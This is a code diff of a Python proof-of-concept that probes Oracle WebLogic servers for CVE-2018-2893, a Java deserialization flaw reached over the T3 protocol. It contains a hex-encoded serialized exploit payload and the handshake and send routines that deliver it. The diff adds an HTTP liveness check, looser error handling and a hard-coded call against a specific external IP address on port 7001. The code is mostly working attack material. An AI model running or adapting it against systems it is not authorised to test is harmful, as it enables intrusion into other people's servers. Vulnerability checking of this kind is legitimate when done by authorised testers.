@@ -6,7 +6,7 @@
 import socket
 import time
 import re
-import math
+import math,requests
 
 VUL = ['CVE-2018-2893']
 
@@ -14,7 +14,9 @@ PAYLOAD = [
     'ACED0005737200257765626C6F6769632E6A6D732E636F6D6D6F6E2E53747265616D4D657373616765496D706C6B88DE4D93CBD45D0C00007872001F7765626C6F6769632E6A6D732E636F6D6D6F6E2E4D657373616765496D706C69126161D04DF1420C000078707A000001251E200000000000000100000118ACED0005737D00000001001A6A6176612E726D692E72656769737472792E5265676973747279787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707372002D6A6176612E726D692E7365727665722E52656D6F74654F626A656374496E766F636174696F6E48616E646C657200000000000000020200007872001C6A6176612E726D692E7365727665722E52656D6F74654F626A656374D361B4910C61331E03000078707732000A556E696361737452656600093132372E302E302E310000F1440000000046911FD80000000000000000000000000000007878']
 
 VER_SIG = ['StreamMessageImpl']
-
+heads = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
+}
 
 def t3handshake(sock, server_addr):
     sock.connect(server_addr)
@@ -43,42 +45,62 @@ def sendEvilObjData(sock, data):
     time.sleep(2)
     sock.send(bytes.fromhex(payload))
     res = b''
-    try:
-        while True:
+    # try:
+    #     while True:
+    #         res += sock.recv(4096)
+    #         time.sleep(0.1)
+    # except :
+    #     pass
+    # return res
+    while True:
+        try:
             res += sock.recv(4096)
             time.sleep(0.1)
-    except Exception as e:
-        pass
-    return res
-
+            return res
+        except:
+            break
 
 def checkVul(res, server_addr):
     p = re.findall(VER_SIG[0], str(res), re.S)
     # print(p)
     if len(p) > 0:
         # print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index])
-        result = '目标weblogic存在JAVA反序列化漏洞,CVE-2018-2893 : %s' % server_addr
+        result = '目标Weblogic存在JAVA反序列化漏洞,CVE-2018-2893 : http://%s' % server_addr
         # print(result)
         return result
+    # else:
+    #     return 'CVE-2018-2893'
+
+def islive(ip):
+    r = requests.get(ip, headers=heads, allow_redirects=False, timeout=10, verify=False)
+    return r.status_code
 
 
 def poc(ip):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
-    sock.settimeout(10)
-    rip = ip.split(':')[0]
-    rport = int(ip.split(':')[1])
-    server_addr = (str(rip), rport)
-    t3handshake(sock, server_addr)
-    buildT3RequestObject(sock, rport)
-    for index in PAYLOAD:
-        rs = sendEvilObjData(sock, index)
-        return checkVul(rs, ip)
+    try:
+        if islive(ip) == 200:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整
+            # socket.setdefaulttimeout(10)
+            sock.settimeout(15)
 
+            if '://' in str(ip):
+                ip = ip.split('//')[1]
+            rip = ip.split(':')[0]
+            rport = int(ip.split(':')[1])
+            server_addr = (str(rip), rport)
+            try:
+                t3handshake(sock, server_addr)
+                buildT3RequestObject(sock, rport)
+                for index in PAYLOAD:
+                    rs = sendEvilObjData(sock, index)
+                    return checkVul(rs, ip)
+            except:
+                pass
+    except:
+        pass
 
 if __name__ == "__main__":
-    # dip = sys.argv[1]
-    # dport = int(sys.argv[2])
-    # run(dip,dport,0)
+
     a = poc('167.86.78.228:7001')
     print(a)
